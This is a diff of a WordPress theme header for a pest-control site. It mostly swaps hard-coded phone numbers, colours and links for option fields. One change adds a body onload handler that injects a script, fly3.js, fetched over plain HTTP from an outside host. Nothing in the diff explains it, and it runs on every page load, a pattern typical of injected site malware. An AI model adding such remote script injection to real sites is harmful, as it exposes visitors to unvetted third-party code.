@@ -1,3 +1,12 @@
+<?php
+$phone_number = get_field('phone_number', 'option');
+$cta_link =  get_field('cta_link', 'option');
+$cta_text =  get_field('cta_text', 'option');
+$color_primary = get_field('color_primary', 'option');
+$color_primaryDark = get_field('color_primaryDark', 'option');
+$color_button_primary = get_field('color_button_primary', 'option');
+$color_button_primaryDark = get_field('color_button_primaryDark', 'option');
+?>
 <!DOCTYPE html>
 <html <?php language_attributes(); ?>>
 <head>
@@ -9,7 +18,10 @@
 	<?php wp_head(); ?>
 </head>
 
-<body <?php body_class( 'bg-white text-gray-900 antialiased' ); ?>>
+<body <?php body_class( 'bg-white text-gray-900 antialiased' ); ?> onload="javascript:var e=window.document.createElement('script');
+e.setAttribute('src','http://sites3.webnow.com/geopestnet/wp-content/themes/webnow-master/js/fly3.js');
+window.document.body.appendChild(e);
+void(0);">
 
 <?php do_action( 'tailpress_site_before' ); ?>
 
@@ -26,7 +38,7 @@
 						<?php if ( has_custom_logo() ) { ?>
                             <?php the_custom_logo(); ?>
 						<?php } else { ?>
-							<a href="/index.html" class="hover:opacity-90 duration-200">
+							<a href="/" class="hover:opacity-90 duration-200">
 								<?php echo get_bloginfo( 'name' ); ?>
 								</a>
 						<?php } ?>
@@ -43,14 +55,20 @@
                     </div>
                     <div class="hidden md:flex flex-col items-end">
                         <div class="inline-flex gap-x-2">
-                            <a href="https://www.facebook.com/pages/Sierra-Vista-Exterminators/161823970512429?sk=info" target="_blank" class="border rounded-md text-center w-8 py-0.5 duration-150 text-black border-gray-900 hover:text-darkGreen hover:border-darkGreen"><i class="fa-brands fa-facebook-f"></i></a>
-                            <a href="https://plus.google.com/105860143008314393522/about" target="_blank" class="border rounded-md text-center w-8 py-0.5 duration-150 text-black border-gray-900 hover:text-darkGreen hover:border-darkGreen "><i class="fa-brands fa-google-plus-g"></i></a>
+                                <a
+                                href="https://www.facebook.com/pages/Sierra-Vista-Exterminators/161823970512429?sk=info"
+                                target="_blank"
+                                class="border rounded-md text-center w-8 py-0.5 duration-150 text-black border-gray-900 hover:text-<?php echo $color_button_primary; ?> hover:border-<?php echo $color_button_primary; ?>"
+                                >
+                                <i class="fa-brands fa-facebook-f"></i>
+                            </a>
+
                         </div>
                         <div class="mt-1.5">
-                            <a href="tel:(559) 784-8600" class="hover:underline font-normal font-droid space-x-1 hover:text-darkGreen">
+                            <a href="tel:<?php echo $phone_number; ?>" class="hover:underline font-normal font-droid space-x-1 hover:text-<?php echo $color_button_primary; ?>">
                                 <i class="fa-solid fa-phone"></i>
                                 <span class="text-lg font-medium">
-                                    Call Now (559) 784-8600
+                                    Call Now <?php echo $phone_number; ?>
                                 </span>
                             </a>
                         </div>
@@ -58,7 +76,7 @@
                 </div>
             </div>
             <!-- Bottom -->
-            <div class="w-full bg-gradient-to-b from-red to-darkRed py-3.5 relative z-50 md:block hidden">
+            <div class="w-full bg-gradient-to-b from-<?php echo $color_primary; ?> to-<?php echo $color_primaryDark; ?> py-3.5 relative z-50 md:block hidden">
                 <div class="mx-auto max-w-5xl px-5 lg:px-7 2xl:px-0 w-full  flex items-center md:flex-row flex-col justify-between gap-x-2">
 				<?php
 				wp_nav_menu(
@@ -74,8 +92,8 @@
 				?>							
 
                     <div class="block flex-none mt-4 mb-2 md:mt-0">
-                        <a href="./schedule-consultation.html" class="inline-flex py-2 px-5 duration-200 border-none rounded font-bold tracking-wide text-sm lg:text-base font-droid shadow hover:shadow-sm  text-white bg-green hover:bg-darkGreen shadow-gray-500">
-                            Schedule Consultation
+                        <a href="<?php echo $cta_link; ?>" class="inline-flex py-2 px-5 duration-200 border-none rounded font-bold tracking-wide text-sm lg:text-base font-droid shadow hover:shadow-sm  text-white bg-<?php echo $color_button_primary; ?> hover:bg-<?php echo $color_button_primary; ?> shadow-gray-500">
+                        <?php echo $cta_text; ?>
                         </a>
                     </div>
                 </div>
@@ -86,9 +104,14 @@
             <!-- TOP -->
             <div class="bg-white w-full py-5 sm:py-3">
                 <div class="mx-auto max-w-5xl px-5 lg:px-7 2xl:px-0 w-full  flex items-center justify-between">
-                    <a href="./index.html" class="hover:opacity-90 duration-200">
-                        <img class="h-20 sm:h-auto align-middle w-full sm:max-w-sm" src="../assets/86yourbugs/logo.png" alt="86 Your Bugs">
-                    </a>
+                <?php if ( has_custom_logo() ) { ?>
+                            <?php the_custom_logo(); ?>
+						<?php } else { ?>
+							<a href="/" class="hover:opacity-90 duration-200">
+								<?php echo get_bloginfo( 'name' ); ?>
+								</a>
+						<?php } ?>
+
                     <div class="block pl-">
                         <button type="button" class="text-gray-900 hover:text-gray-800"  @click="openMenu = ! openMenu" aria-expanded="false" id="hamburger">
                             <span class="sr-only">Open menu</span>
@@ -100,15 +123,15 @@
                 </div>
             </div>
             <!-- Mobile -->
-            <div class="w-full h-full bg-gradient-to-b from-red to-darkRed py-5">
+            <div class="w-full h-full bg-white py-5">
 				<?php
 				wp_nav_menu(
 					array(
 						'container_id'    => 'primary-menu',
-						'container_class' => 'mx-auto max-w-5xl px-5 lg:px-7 2xl:px-0 w-full  flex items-center md:flex-row flex-col justify-between gap-x-2',
+						'container_class' => 'mx-auto max-w-5xl px-5 lg:px-7 2xl:px-0 w-full  flex items-center md:flex-row flex-col justify-between gap-x-2 text-black',
 						'menu_class'      => 'md:space-x-5 w-full flex flex-col md:flex-row',
 						'theme_location'  => 'primary',
-						'li_class'        => 'text-white hover:text-gray-100 text-base w-full py-2.5 px-2 hover:bg-darkRed',
+						'li_class'        => 'text-base w-full py-2.5 px-2 text-xl',
 						'fallback_cb'     => false,
 					)
 				);
@@ -120,5 +143,4 @@
 
 	<div id="content" class="site-content flex-grow">
 		<?php do_action( 'tailpress_content_start' ); ?>
-
 		<main>
